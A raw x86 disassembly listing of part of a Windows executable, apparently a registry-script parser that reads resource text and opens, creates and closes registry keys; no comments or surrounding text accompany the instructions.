  403931:	je     0x40399a
  403933:	mov    eax,DWORD PTR [edi]
  403935:	push   0x27
  403937:	pop    ebx
  403938:	cmp    bx,WORD PTR [eax]
  40393b:	jne    0x403949
  40393d:	push   eax
  40393e:	call   DWORD PTR ds:0x4090f0
  403944:	cmp    bx,WORD PTR [eax]
  403947:	jne    0x403997
  403949:	mov    eax,DWORD PTR [edi]
  40394b:	cmp    bx,WORD PTR [eax]
  40394e:	jne    0x403959
  403950:	push   eax
  403951:	call   DWORD PTR ds:0x4090f0
  403957:	mov    DWORD PTR [edi],eax
  403959:	mov    ebx,DWORD PTR [edi]
  40395b:	push   ebx
  40395c:	call   DWORD PTR ds:0x4090f0
  403962:	mov    edx,eax
  403964:	mov    DWORD PTR [edi],edx
  403966:	sub    edx,ebx
  403968:	sar    edx,1
  40396a:	lea    ecx,[edx+0x1]
  40396d:	lea    ecx,[esi+ecx*2]
  403970:	cmp    ecx,DWORD PTR [ebp-0x4]
  403973:	jae    0x403a17
  403979:	test   edx,edx
  40397b:	jle    0x40398e
  40397d:	sub    ebx,esi
  40397f:	mov    ax,WORD PTR [ebx+esi*1]
  403983:	mov    WORD PTR [esi],ax
  403986:	add    esi,0x2
  403989:	sub    edx,0x1
  40398c:	jne    0x40397f
  40398e:	mov    eax,DWORD PTR [edi]
  403990:	xor    ecx,ecx
  403992:	cmp    cx,WORD PTR [eax]
  403995:	jne    0x403933
  403997:	mov    ebx,DWORD PTR [ebp-0x4]
  40399a:	mov    eax,DWORD PTR [edi]
  40399c:	xor    ecx,ecx
  40399e:	cmp    cx,WORD PTR [eax]
  4039a1:	je     0x403a17
  4039a3:	cmp    esi,ebx
  4039a5:	jae    0x403a17
  4039a7:	xor    eax,eax
  4039a9:	mov    WORD PTR [esi],ax
  4039ac:	push   DWORD PTR [edi]
  4039ae:	call   DWORD PTR ds:0x4090f0
  4039b4:	mov    DWORD PTR [edi],eax
  4039b6:	jmp    0x403a13
  4039b8:	mov    ebx,DWORD PTR [edi]
  4039ba:	movzx  eax,WORD PTR [ebx]
  4039bd:	cmp    eax,0x9
  4039c0:	jl     0x4039d1
  4039c2:	cmp    eax,0xa
  4039c5:	jle    0x403a09
  4039c7:	cmp    eax,0xd
  4039ca:	je     0x403a09
  4039cc:	cmp    eax,0x20
  4039cf:	je     0x403a09
  4039d1:	push   ebx
  4039d2:	call   DWORD PTR ds:0x4090f0
  4039d8:	mov    edx,eax
  4039da:	mov    DWORD PTR [edi],edx
  4039dc:	sub    edx,ebx
  4039de:	sar    edx,1
  4039e0:	lea    ecx,[edx+0x1]
  4039e3:	lea    ecx,[esi+ecx*2]
  4039e6:	cmp    ecx,DWORD PTR [ebp-0x4]
  4039e9:	jae    0x403a17
  4039eb:	test   edx,edx
  4039ed:	jle    0x403a00
  4039ef:	sub    ebx,esi
  4039f1:	mov    ax,WORD PTR [ebx+esi*1]
  4039f5:	mov    WORD PTR [esi],ax
  4039f8:	add    esi,0x2
  4039fb:	sub    edx,0x1
  4039fe:	jne    0x4039f1
  403a00:	mov    eax,DWORD PTR [edi]
  403a02:	xor    ecx,ecx
  403a04:	cmp    cx,WORD PTR [eax]
  403a07:	jne    0x4039b8
  403a09:	cmp    esi,DWORD PTR [ebp-0x4]
  403a0c:	jae    0x403a17
  403a0e:	xor    eax,eax
  403a10:	mov    WORD PTR [esi],ax
  403a13:	xor    eax,eax
  403a15:	jmp    0x403a1c
  403a17:	mov    eax,0x80020009
  403a1c:	pop    esi
  403a1d:	pop    ebx
  403a1e:	pop    edi
  403a1f:	mov    esp,ebp
  403a21:	pop    ebp
  403a22:	ret    0x4
  403a25:	int3   
  403a26:	int3   
  403a27:	int3   
  403a28:	int3   
  403a29:	int3   
  403a2a:	mov    edi,edi
  403a2c:	push   ebp
  403a2d:	mov    ebp,esp
  403a2f:	and    esp,0xfffffff8
  403a32:	mov    eax,0x2264
  403a37:	call   0x407ac0
  403a3c:	mov    eax,ds:0x408008
  403a41:	xor    eax,esp
  403a43:	mov    DWORD PTR [esp+0x2260],eax
  403a4a:	mov    eax,ecx
  403a4c:	mov    ecx,DWORD PTR [ebp+0xc]
  403a4f:	push   ebx
  403a50:	mov    DWORD PTR [esp+0x14],ecx
  403a54:	xor    ecx,ecx
  403a56:	push   esi
  403a57:	mov    ebx,ecx
  403a59:	mov    DWORD PTR [esp+0x2c],ecx
  403a5d:	mov    DWORD PTR [esp+0x24],ecx
  403a61:	mov    DWORD PTR [esp+0x28],ecx
  403a65:	mov    ecx,DWORD PTR [ebp+0x14]
  403a68:	push   edi
  403a69:	mov    edi,DWORD PTR [ebp+0x8]
  403a6c:	mov    DWORD PTR [esp+0x34],ecx
  403a70:	mov    ecx,eax
  403a72:	push   edi
  403a73:	mov    DWORD PTR [esp+0x18],eax
  403a77:	mov    DWORD PTR [esp+0x28],ebx
  403a7b:	call   0x4038e5
  403a80:	mov    esi,eax
  403a82:	test   esi,esi
  403a84:	js     0x403fc3
  403a8a:	jmp    0x403f80
  403a8f:	push   0x401208
  403a94:	push   edi
  403a95:	mov    DWORD PTR [esp+0x18],0x1
  403a9d:	call   DWORD PTR ds:0x40904c
  403aa3:	neg    eax
  403aa5:	push   0x4011dc
  403aaa:	sbb    esi,esi
  403aac:	inc    esi
  403aad:	push   edi
  403aae:	mov    DWORD PTR [esp+0x20],esi
  403ab2:	call   DWORD PTR ds:0x40904c
  403ab8:	test   eax,eax
  403aba:	je     0x403ac4
  403abc:	test   esi,esi
  403abe:	je     0x403b46
  403ac4:	mov    ecx,DWORD PTR [esp+0x14]
  403ac8:	push   edi
  403ac9:	call   0x4038e5
  403ace:	mov    esi,eax
  403ad0:	test   esi,esi
  403ad2:	js     0x403fb8
  403ad8:	xor    esi,esi
  403ada:	cmp    DWORD PTR [ebp+0x10],esi
  403add:	je     0x403b48
  403adf:	push   0x5c
  403ae1:	pop    edx
  403ae2:	mov    ecx,edi
  403ae4:	mov    DWORD PTR [esp+0x38],esi
  403ae8:	mov    DWORD PTR [esp+0x3c],esi
  403aec:	mov    DWORD PTR [esp+0x40],esi
  403af0:	call   0x40309e
  403af5:	test   eax,eax
  403af7:	jne    0x403fb3
  403afd:	push   edi
  403afe:	call   0x40366f
  403b03:	test   eax,eax
  403b05:	je     0x403b1d
  403b07:	mov    eax,DWORD PTR [esp+0x1c]
  403b0b:	lea    ecx,[esp+0x38]
  403b0f:	push   edi
  403b10:	mov    DWORD PTR [esp+0x3c],eax
  403b14:	call   0x4036a5
  403b19:	mov    DWORD PTR [esp+0x38],esi
  403b1d:	cmp    DWORD PTR [esp+0x18],esi
  403b21:	je     0x403b48
  403b23:	mov    ecx,DWORD PTR [esp+0x14]
  403b27:	push   edi
  403b28:	call   0x4038e5
  403b2d:	mov    esi,eax
  403b2f:	test   esi,esi
  403b31:	js     0x403fb8
  403b37:	mov    ecx,DWORD PTR [esp+0x14]
  403b3b:	push   edi
  403b3c:	call   0x403601
  403b41:	jmp    0x403d71
  403b46:	xor    esi,esi
  403b48:	push   0x4011f4
  403b4d:	push   edi
  403b4e:	call   DWORD PTR ds:0x40904c
  403b54:	test   eax,eax
  403b56:	jne    0x403b70
  403b58:	mov    ecx,DWORD PTR [esp+0x14]
  403b5c:	push   edi
  403b5d:	mov    DWORD PTR [esp+0x14],esi
  403b61:	call   0x4038e5
  403b66:	mov    esi,eax
  403b68:	test   esi,esi
  403b6a:	js     0x403fb8
  403b70:	push   0x4011d4
  403b75:	push   edi
  403b76:	call   DWORD PTR ds:0x40904c
  403b7c:	test   eax,eax
  403b7e:	jne    0x403c74
  403b84:	mov    ecx,DWORD PTR [esp+0x14]
  403b88:	lea    eax,[esp+0x268]
  403b8f:	push   eax
  403b90:	call   0x4038e5
  403b95:	mov    esi,eax
  403b97:	test   esi,esi
  403b99:	js     0x403fb8
  403b9f:	mov    ecx,DWORD PTR [esp+0x14]
  403ba3:	push   edi
  403ba4:	call   0x4038e5
  403ba9:	mov    esi,eax
  403bab:	test   esi,esi
  403bad:	js     0x403fb8
  403bb3:	push   0x3d
  403bb5:	pop    eax
  403bb6:	cmp    WORD PTR [edi],ax
  403bb9:	jne    0x403fb3
  403bbf:	cmp    DWORD PTR [ebp+0x10],0x0
  403bc3:	je     0x403bfb
  403bc5:	mov    ecx,DWORD PTR [esp+0x14]
  403bc9:	xor    eax,eax
  403bcb:	mov    DWORD PTR [esp+0x48],eax
  403bcf:	mov    DWORD PTR [esp+0x4c],eax
  403bd3:	mov    eax,DWORD PTR [esp+0x1c]
  403bd7:	mov    DWORD PTR [esp+0x44],eax
  403bdb:	lea    eax,[esp+0x268]
  403be2:	push   edi
  403be3:	push   eax
  403be4:	lea    eax,[esp+0x4c]
  403be8:	push   eax
  403be9:	call   0x4031f9
  403bee:	mov    esi,eax
  403bf0:	xor    eax,eax
  403bf2:	mov    DWORD PTR [esp+0x44],eax
  403bf6:	jmp    0x403d73
  403bfb:	cmp    DWORD PTR [ebp+0x14],0x0
  403bff:	jne    0x403c5b
  403c01:	cmp    DWORD PTR [esp+0x10],0x0
  403c06:	je     0x403c5b
  403c08:	lea    eax,[esp+0x10]
  403c0c:	xor    ecx,ecx
  403c0e:	push   eax
  403c0f:	push   0x20006
  403c14:	push   ecx
  403c15:	push   ecx
  403c16:	push   DWORD PTR [esp+0x2c]
  403c1a:	mov    DWORD PTR [esp+0x24],ecx
  403c1e:	call   DWORD PTR ds:0x409008
  403c24:	test   eax,eax
  403c26:	jne    0x403fa8
  403c2c:	mov    esi,DWORD PTR [esp+0x10]
  403c30:	lea    eax,[esp+0x268]
  403c37:	push   eax
  403c38:	push   esi
  403c39:	mov    DWORD PTR [esp+0x20],esi
  403c3d:	call   DWORD PTR ds:0x409014
  403c43:	test   eax,eax
  403c45:	je     0x403c50
  403c47:	cmp    eax,0x2
  403c4a:	jne    0x403f8e
  403c50:	test   esi,esi
  403c52:	je     0x403c5b
  403c54:	push   esi
  403c55:	call   DWORD PTR ds:0x409018
  403c5b:	mov    ecx,DWORD PTR [esp+0x14]
  403c5f:	push   edi
  403c60:	call   0x403601
  403c65:	mov    esi,eax
  403c67:	test   esi,esi
  403c69:	js     0x403fb8
  403c6f:	jmp    0x403f80
  403c74:	push   0x5c
  403c76:	pop    edx
  403c77:	mov    ecx,edi
  403c79:	call   0x40309e
  403c7e:	test   eax,eax
  403c80:	jne    0x403fb3
  403c86:	cmp    DWORD PTR [ebp+0x10],eax
  403c89:	je     0x403dd0
  403c8f:	mov    esi,DWORD PTR [esp+0x1c]
  403c93:	lea    eax,[esp+0x10]
  403c97:	push   eax
  403c98:	push   0x2001f
  403c9d:	xor    ecx,ecx
  403c9f:	push   ecx
  403ca0:	push   edi
  403ca1:	push   esi
  403ca2:	mov    DWORD PTR [esp+0x24],ecx
  403ca6:	call   DWORD PTR ds:0x409008
  403cac:	test   eax,eax
  403cae:	jne    0x403cc7
  403cb0:	test   ebx,ebx
  403cb2:	je     0x403cbb
  403cb4:	push   ebx
  403cb5:	call   DWORD PTR ds:0x409018
  403cbb:	mov    ebx,DWORD PTR [esp+0x10]
  403cbf:	mov    DWORD PTR [esp+0x24],ebx
  403cc3:	test   eax,eax
  403cc5:	je     0x403d3f
  403cc7:	lea    eax,[esp+0x10]
  403ccb:	xor    ecx,ecx
  403ccd:	push   eax
  403cce:	push   0x20019
  403cd3:	push   ecx
  403cd4:	push   edi
  403cd5:	push   esi
  403cd6:	mov    DWORD PTR [esp+0x24],ecx
  403cda:	call   DWORD PTR ds:0x409008
  403ce0:	test   eax,eax
  403ce2:	jne    0x403cfb
  403ce4:	test   ebx,ebx
  403ce6:	je     0x403cef
  403ce8:	push   ebx
  403ce9:	call   DWORD PTR ds:0x409018
  403cef:	mov    ebx,DWORD PTR [esp+0x10]
  403cf3:	mov    DWORD PTR [esp+0x24],ebx
  403cf7:	test   eax,eax
  403cf9:	je     0x403d3f
  403cfb:	lea    eax,[esp+0x5c]
  403cff:	xor    ecx,ecx
  403d01:	push   eax
  403d02:	lea    eax,[esp+0x14]
  403d06:	mov    DWORD PTR [esp+0x14],ecx
  403d0a:	push   eax
  403d0b:	push   ecx
  403d0c:	push   0x2001f
  403d11:	push   ecx
  403d12:	push   ecx
  403d13:	push   ecx
  403d14:	push   edi
  403d15:	push   esi
  403d16:	call   DWORD PTR ds:0x409010
  403d1c:	test   eax,eax
  403d1e:	jne    0x403fa8
  403d24:	test   ebx,ebx
  403d26:	je     0x403d2f
  403d28:	push   ebx
  403d29:	call   DWORD PTR ds:0x409018
  403d2f:	mov    ebx,DWORD PTR [esp+0x10]
  403d33:	mov    DWORD PTR [esp+0x24],ebx
  403d37:	test   eax,eax
  403d39:	jne    0x403fa8
  403d3f:	mov    ecx,DWORD PTR [esp+0x14]
  403d43:	push   edi
  403d44:	call   0x4038e5
  403d49:	mov    esi,eax
  403d4b:	test   esi,esi
  403d4d:	js     0x403fb8
  403d53:	push   0x3d
  403d55:	pop    eax
  403d56:	cmp    WORD PTR [edi],ax
  403d59:	jne    0x403d7b
  403d5b:	mov    ecx,DWORD PTR [esp+0x14]
  403d5f:	xor    eax,eax
  403d61:	push   edi
  403d62:	push   eax
  403d63:	lea    eax,[esp+0x2c]
  403d67:	push   eax
  403d68:	call   0x4031f9
  403d6d:	mov    ebx,DWORD PTR [esp+0x24]
  403d71:	mov    esi,eax
  403d73:	test   esi,esi
  403d75:	js     0x403fb8
  403d7b:	push   0x7b
  403d7d:	pop    eax
  403d7e:	cmp    WORD PTR [edi],ax
  403d81:	jne    0x403f80
  403d87:	mov    ecx,edi
  403d89:	lea    edx,[ecx+0x2]
  403d8c:	mov    ax,WORD PTR [ecx]
  403d8f:	add    ecx,0x2
  403d92:	cmp    ax,WORD PTR [esp+0x30]
  403d97:	jne    0x403d8c
  403d99:	sub    ecx,edx
  403d9b:	sar    ecx,1
  403d9d:	cmp    ecx,0x1
  403da0:	jne    0x403f80
  403da6:	mov    ecx,DWORD PTR [esp+0x14]
  403daa:	xor    eax,eax
  403dac:	push   eax
  403dad:	push   DWORD PTR [ebp+0x10]
  403db0:	push   ebx
  403db1:	push   edi
  403db2:	call   0x403a2a
  403db7:	mov    esi,eax
  403db9:	test   esi,esi
  403dbb:	js     0x403fb8
  403dc1:	mov    ecx,DWORD PTR [esp+0x14]
  403dc5:	push   edi
  403dc6:	call   0x4038e5
  403dcb:	jmp    0x403c65
  403dd0:	cmp    DWORD PTR [ebp+0x14],0x0
  403dd4:	jne    0x403e19
  403dd6:	lea    eax,[esp+0x18]
  403dda:	xor    esi,esi
  403ddc:	push   eax
  403ddd:	push   0x20019
  403de2:	push   esi
  403de3:	push   edi
  403de4:	push   DWORD PTR [esp+0x2c]
  403de8:	mov    DWORD PTR [esp+0x2c],esi
  403dec:	call   DWORD PTR ds:0x409008
  403df2:	mov    DWORD PTR [esp+0x20],eax
  403df6:	test   eax,eax
  403df8:	jne    0x403e24
  403dfa:	mov    DWORD PTR [esp+0x20],esi
  403dfe:	mov    eax,esi
  403e00:	test   ebx,ebx
  403e02:	je     0x403e0f
  403e04:	push   ebx
  403e05:	call   DWORD PTR ds:0x409018
  403e0b:	mov    DWORD PTR [esp+0x20],eax
  403e0f:	mov    ebx,DWORD PTR [esp+0x18]
  403e13:	mov    DWORD PTR [esp+0x24],ebx
  403e17:	jmp    0x403e20
  403e19:	push   0x2
  403e1b:	pop    eax
  403e1c:	mov    DWORD PTR [esp+0x20],eax
  403e20:	test   eax,eax
  403e22:	je     0x403e2b
  403e24:	mov    DWORD PTR [ebp+0x14],0x1
  403e2b:	push   0xffffffff
  403e2d:	push   edi
  403e2e:	lea    eax,[esp+0x68]
  403e32:	push   0x104
  403e37:	push   eax
  403e38:	call   DWORD PTR ds:0x409238
  403e3e:	add    esp,0x10
  403e41:	mov    ecx,eax
  403e43:	call   0x40467c
  403e48:	mov    ecx,DWORD PTR [esp+0x14]
  403e4c:	push   edi
  403e4d:	call   0x4038e5
  403e52:	mov    esi,eax
  403e54:	test   esi,esi
  403e56:	js     0x403fb8
  403e5c:	mov    ecx,DWORD PTR [esp+0x14]
  403e60:	push   edi
  403e61:	call   0x403601
  403e66:	mov    esi,eax
  403e68:	test   esi,esi
  403e6a:	js     0x403fb8
  403e70:	push   0x7b
  403e72:	pop    eax
  403e73:	cmp    WORD PTR [edi],ax
  403e76:	jne    0x403ec8
  403e78:	mov    ecx,edi
  403e7a:	lea    edx,[ecx+0x2]
  403e7d:	mov    ax,WORD PTR [ecx]
  403e80:	add    ecx,0x2
  403e83:	cmp    ax,WORD PTR [esp+0x30]
  403e88:	jne    0x403e7d
  403e8a:	sub    ecx,edx
  403e8c:	sar    ecx,1
  403e8e:	cmp    ecx,0x1
  403e91:	jne    0x403ec8
  403e93:	push   DWORD PTR [ebp+0x14]
  403e96:	mov    ecx,DWORD PTR [esp+0x18]
  403e9a:	xor    eax,eax
  403e9c:	push   eax
  403e9d:	push   ebx
  403e9e:	push   edi
  403e9f:	call   0x403a2a
  403ea4:	mov    esi,eax
  403ea6:	test   esi,esi
  403ea8:	jns    0x403eb4
  403eaa:	cmp    DWORD PTR [ebp+0x14],0x0
  403eae:	je     0x403fb8
  403eb4:	mov    ecx,DWORD PTR [esp+0x14]
  403eb8:	push   edi
  403eb9:	call   0x4038e5
  403ebe:	mov    esi,eax
  403ec0:	test   esi,esi
  403ec2:	js     0x403fb8
  403ec8:	mov    ecx,DWORD PTR [esp+0x20]
  403ecc:	mov    eax,DWORD PTR [esp+0x34]
  403ed0:	mov    DWORD PTR [ebp+0x14],eax
  403ed3:	cmp    ecx,0x2
  403ed6:	je     0x403f80
  403edc:	test   ecx,ecx
  403ede:	je     0x403eed
  403ee0:	test   eax,eax
  403ee2:	je     0x403faa
  403ee8:	jmp    0x403f80
  403eed:	test   eax,eax
  403eef:	je     0x403f24
  403ef1:	push   ebx
  403ef2:	call   0x4037e1
  403ef7:	test   eax,eax
  403ef9:	je     0x403f24
  403efb:	lea    eax,[esp+0x60]
  403eff:	push   eax
  403f00:	call   0x40366f
  403f05:	test   eax,eax
  403f07:	je     0x403f80
  403f09:	cmp    DWORD PTR [esp+0x10],0x0
  403f0e:	je     0x403f80
  403f10:	lea    eax,[esp+0x60]
  403f14:	push   eax
  403f15:	lea    ecx,[esp+0x28]
  403f19:	call   0x4036a5
  403f1e:	mov    ebx,DWORD PTR [esp+0x24]
  403f22:	jmp    0x403f80
  403f24:	push   ebx
  403f25:	call   0x4037e1
  403f2a:	mov    DWORD PTR [esp+0x18],eax
  403f2e:	test   ebx,ebx
  403f30:	je     0x403f4b
  403f32:	push   ebx
  403f33:	call   DWORD PTR ds:0x409018
  403f39:	xor    ecx,ecx
  403f3b:	mov    ebx,ecx
  403f3d:	mov    DWORD PTR [esp+0x24],ebx
  403f41:	test   eax,eax
  403f43:	jne    0x403fa8
  403f45:	mov    eax,DWORD PTR [esp+0x18]
  403f49:	jmp    0x403f4d
  403f4b:	xor    ecx,ecx
  403f4d:	cmp    DWORD PTR [esp+0x10],0x0
  403f52:	je     0x403f80
  403f54:	test   eax,eax
  403f56:	jne    0x403f80
  403f58:	mov    eax,DWORD PTR [esp+0x1c]
  403f5c:	mov    DWORD PTR [esp+0x50],eax
  403f60:	lea    eax,[esp+0x60]
  403f64:	mov    DWORD PTR [esp+0x54],ecx
  403f68:	mov    DWORD PTR [esp+0x58],ecx
  403f6c:	lea    ecx,[esp+0x50]
  403f70:	push   eax
  403f71:	call   0x40381f
  403f76:	xor    ecx,ecx
  403f78:	mov    DWORD PTR [esp+0x50],ecx
  403f7c:	test   eax,eax
  403f7e:	jne    0x403fa8
  403f80:	push   0x7d
  403f82:	pop    eax
  403f83:	cmp    WORD PTR [edi],ax
  403f86:	jne    0x403a8f
  403f8c:	jmp    0x403fb8
  403f8e:	mov    ecx,eax
  403f90:	call   0x4038d0
  403f95:	mov    esi,eax
  403f97:	mov    eax,DWORD PTR [esp+0x18]
  403f9b:	test   eax,eax
  403f9d:	je     0x403fb8
  403f9f:	push   eax
  403fa0:	call   DWORD PTR ds:0x409018
  403fa6:	jmp    0x403fb8
  403fa8:	mov    ecx,eax
  403faa:	call   0x4038d0
  403faf:	mov    esi,eax
  403fb1:	jmp    0x403fb8
  403fb3:	mov    esi,0x80020009
  403fb8:	test   ebx,ebx
  403fba:	je     0x403fc3
  403fbc:	push   ebx
  403fbd:	call   DWORD PTR ds:0x409018
  403fc3:	mov    ecx,DWORD PTR [esp+0x226c]
  403fca:	mov    eax,esi
  403fcc:	pop    edi
  403fcd:	pop    esi
  403fce:	pop    ebx
  403fcf:	xor    ecx,esp
  403fd1:	call   0x4071f0
  403fd6:	mov    esp,ebp
  403fd8:	pop    ebp
  403fd9:	ret    0x10
  403fdc:	int3   
  403fdd:	int3   
  403fde:	int3   
  403fdf:	int3   
  403fe0:	int3   
  403fe1:	mov    edi,edi
  403fe3:	push   esi
  403fe4:	mov    esi,ecx
  403fe6:	mov    ecx,DWORD PTR [esi]
  403fe8:	movzx  eax,WORD PTR [ecx]
  403feb:	cmp    eax,0x9
  403fee:	jl     0x40400a
  403ff0:	cmp    eax,0xa
  403ff3:	jle    0x403fff
  403ff5:	cmp    eax,0xd
  403ff8:	je     0x403fff
  403ffa:	cmp    eax,0x20
  403ffd:	jne    0x40400a
  403fff:	push   ecx
  404000:	call   DWORD PTR ds:0x4090f0
  404006:	mov    DWORD PTR [esi],eax
  404008:	jmp    0x403fe6
  40400a:	pop    esi
  40400b:	ret    
  40400c:	int3   
  40400d:	int3   
  40400e:	int3   
  40400f:	int3   
  404010:	int3   
  404011:	mov    edi,edi
  404013:	push   ebp
  404014:	mov    ebp,esp
  404016:	mov    eax,0x200c
  40401b:	call   0x407ac0
  404020:	mov    eax,ds:0x408008
  404025:	xor    eax,ebp
  404027:	mov    DWORD PTR [ebp-0x4],eax
  40402a:	mov    eax,DWORD PTR [ebp+0x8]
  40402d:	and    DWORD PTR [ebp-0x2008],0x0
  404034:	push   esi
  404035:	push   edi
  404036:	mov    edi,ecx
  404038:	lea    ecx,[ebp-0x2008]
  40403e:	push   ecx
  40403f:	push   eax
  404040:	mov    ecx,edi
  404042:	call   0x402ee6
  404047:	mov    esi,eax
  404049:	test   esi,esi
  40404b:	js     0x404158
  404051:	mov    eax,DWORD PTR [ebp-0x2008]
  404057:	xor    ecx,ecx
  404059:	mov    DWORD PTR [edi],eax
  40405b:	cmp    cx,WORD PTR [eax]
  40405e:	je     0x40414a
  404064:	push   ebx
  404065:	lea    eax,[ebp-0x2004]
  40406b:	mov    ecx,edi
  40406d:	push   eax
  40406e:	call   0x4038e5
  404073:	mov    esi,eax
  404075:	test   esi,esi
  404077:	js     0x404149
  40407d:	xor    esi,esi
  40407f:	push   DWORD PTR [esi*8+0x401620]
  404086:	lea    eax,[ebp-0x2004]
  40408c:	push   eax
  40408d:	call   DWORD PTR ds:0x40904c
  404093:	test   eax,eax
  404095:	je     0x4040a1
  404097:	inc    esi
  404098:	cmp    esi,0xe
  40409b:	jb     0x40407f
  40409d:	xor    ebx,ebx
  40409f:	jmp    0x4040a8
  4040a1:	mov    ebx,DWORD PTR [esi*8+0x401624]
  4040a8:	test   ebx,ebx
  4040aa:	je     0x404144
  4040b0:	lea    eax,[ebp-0x2004]
  4040b6:	mov    ecx,edi
  4040b8:	push   eax
  4040b9:	call   0x4038e5
  4040be:	mov    esi,eax
  4040c0:	test   esi,esi
  4040c2:	js     0x404149
  4040c8:	push   0x7b
  4040ca:	pop    eax
  4040cb:	cmp    ax,WORD PTR [ebp-0x2004]
  4040d2:	jne    0x404144
  4040d4:	cmp    DWORD PTR [ebp+0xc],0x0
  4040d8:	mov    ecx,edi
  4040da:	push   0x0
  4040dc:	je     0x404119
  4040de:	push   DWORD PTR [ebp+0xc]
  4040e1:	mov    eax,DWORD PTR [edi]
  4040e3:	mov    DWORD PTR [ebp-0x200c],eax
  4040e9:	lea    eax,[ebp-0x2004]
  4040ef:	push   ebx
  4040f0:	push   eax
  4040f1:	call   0x403a2a
  4040f6:	mov    esi,eax
  4040f8:	test   esi,esi
  4040fa:	jns    0x40412e
  4040fc:	mov    eax,DWORD PTR [ebp-0x200c]
  404102:	mov    ecx,edi
  404104:	push   0x0
  404106:	push   0x0
  404108:	mov    DWORD PTR [edi],eax
  40410a:	lea    eax,[ebp-0x2004]
  404110:	push   ebx
  404111:	push   eax
  404112:	call   0x403a2a
  404117:	jmp    0x404149
  404119:	push   0x0
  40411b:	push   ebx
  40411c:	lea    eax,[ebp-0x2004]
  404122:	push   eax
  404123:	call   0x403a2a
  404128:	mov    esi,eax
  40412a:	test   esi,esi
  40412c:	js     0x404149
  40412e:	mov    ecx,edi
  404130:	call   0x403fe1
  404135:	mov    eax,DWORD PTR [edi]
  404137:	xor    ecx,ecx
  404139:	cmp    cx,WORD PTR [eax]
  40413c:	jne    0x404065
  404142:	jmp    0x404149
  404144:	mov    esi,0x80020009
  404149:	pop    ebx
  40414a:	push   DWORD PTR [ebp-0x2008]
  404150:	call   DWORD PTR ds:0x40910c
  404156:	mov    eax,esi
  404158:	mov    ecx,DWORD PTR [ebp-0x4]
  40415b:	pop    edi
  40415c:	xor    ecx,ebp
  40415e:	pop    esi
  40415f:	call   0x4071f0
  404164:	mov    esp,ebp
  404166:	pop    ebp
  404167:	ret    0x8
  40416a:	int3   
  40416b:	int3   
  40416c:	int3   
  40416d:	int3   
  40416e:	int3   
  40416f:	mov    edi,edi
  404171:	push   ebp
  404172:	mov    ebp,esp
  404174:	sub    esp,0x414
  40417a:	mov    eax,ds:0x408008
  40417f:	xor    eax,ebp
  404181:	mov    DWORD PTR [ebp-0x4],eax
  404184:	mov    eax,DWORD PTR [ebp+0x8]
  404187:	xor    edx,edx
  404189:	push   ebx
  40418a:	mov    ebx,DWORD PTR [ebp+0x10]
  40418d:	push   esi
  40418e:	mov    esi,DWORD PTR [ebp+0xc]
  404191:	push   edi
  404192:	push   0x2
  404194:	mov    DWORD PTR [ebp-0x410],ecx
  40419a:	pop    ecx
  40419b:	push   ecx
  40419c:	push   edx
  40419d:	push   eax
  40419e:	mov    DWORD PTR [ebp-0x40c],edx
  4041a4:	mov    DWORD PTR [ebp-0x414],edx
  4041aa:	mov    DWORD PTR [ebp-0x408],edx
  4041b0:	call   DWORD PTR ds:0x40907c
  4041b6:	mov    edi,eax
  4041b8:	test   edi,edi
  4041ba:	jne    0x4041c8
  4041bc:	call   0x402dbf
  4041c1:	mov    esi,eax
  4041c3:	jmp    0x404295
  4041c8:	push   0x0
  4041ca:	push   esi
  4041cb:	push   ebx
  4041cc:	push   edi
  4041cd:	call   DWORD PTR ds:0x40905c
  4041d3:	mov    esi,eax
  4041d5:	test   esi,esi
  4041d7:	jne    0x4041e3
  4041d9:	call   0x402dbf
  4041de:	jmp    0x40428c
  4041e3:	push   esi
  4041e4:	push   edi
  4041e5:	call   DWORD PTR ds:0x409058
  4041eb:	mov    ebx,eax
  4041ed:	test   ebx,ebx
  4041ef:	je     0x4041d9
  4041f1:	push   esi
  4041f2:	push   edi
  4041f3:	call   DWORD PTR ds:0x409054
  4041f9:	mov    esi,eax
  4041fb:	lea    eax,[esi+0x1]
  4041fe:	cmp    eax,esi
  404200:	jae    0x40420c
  404202:	mov    esi,0x8007000e
  404207:	jmp    0x404295
  40420c:	push   0x2
  40420e:	pop    ecx
  40420f:	mul    ecx
  404211:	test   edx,edx
  404213:	jne    0x4042ce
  404219:	cmp    eax,0xffffffff
  40421c:	ja     0x4042ce
  404222:	cmp    eax,0x400
  404227:	jbe    0x40423d
  404229:	push   eax
  40422a:	lea    ecx,[ebp-0x408]
  404230:	call   0x402d92
  404235:	mov    eax,DWORD PTR [ebp-0x408]
  40423b:	jmp    0x404249
  40423d:	lea    eax,[ebp-0x404]
  404243:	mov    DWORD PTR [ebp-0x408],eax
  404249:	test   eax,eax
  40424b:	jne    0x404254
  40424d:	mov    esi,0x8007000e
  404252:	jmp    0x40428e
  404254:	push   esi
  404255:	push   eax
  404256:	push   esi
  404257:	push   ebx
  404258:	push   0x0
  40425a:	push   0x3
  40425c:	call   DWORD PTR ds:0x409050
  404262:	mov    ecx,eax
  404264:	test   ecx,ecx
  404266:	je     0x4041d9
  40426c:	mov    eax,DWORD PTR [ebp-0x408]
  404272:	xor    edx,edx
  404274:	push   DWORD PTR [ebp+0x14]
  404277:	mov    WORD PTR [eax+ecx*2],dx
  40427b:	lea    ecx,[ebp-0x414]
  404281:	push   DWORD PTR [ebp-0x408]
  404287:	call   0x404011
  40428c:	mov    esi,eax
  40428e:	push   edi
  40428f:	call   DWORD PTR ds:0x409034
  404295:	lea    eax,[ebp-0x404]
  40429b:	cmp    DWORD PTR [ebp-0x408],eax
  4042a1:	je     0x4042ae
  4042a3:	lea    ecx,[ebp-0x408]
  4042a9:	call   0x402d83
  4042ae:	lea    ecx,[ebp-0x40c]
  4042b4:	call   0x4031d8
  4042b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4042bc:	mov    eax,esi
  4042be:	pop    edi
  4042bf:	pop    esi
  4042c0:	xor    ecx,ebp
  4042c2:	pop    ebx
  4042c3:	call   0x4071f0
  4042c8:	mov    esp,ebp
  4042ca:	pop    ebp
  4042cb:	ret    0x10
  4042ce:	mov    ecx,0x80070057
  4042d3:	call   0x4046c7
  4042d8:	int3   
  4042d9:	int3   
  4042da:	int3   
  4042db:	int3   
  4042dc:	int3   
  4042dd:	int3   
  4042de:	mov    edi,edi
  4042e0:	push   ebp
  4042e1:	mov    ebp,esp
  4042e3:	sub    esp,0xa50
  4042e9:	mov    eax,ds:0x408008
  4042ee:	xor    eax,ebp
  4042f0:	mov    DWORD PTR [ebp-0x4],eax
  4042f3:	push   ebx
  4042f4:	xor    eax,eax
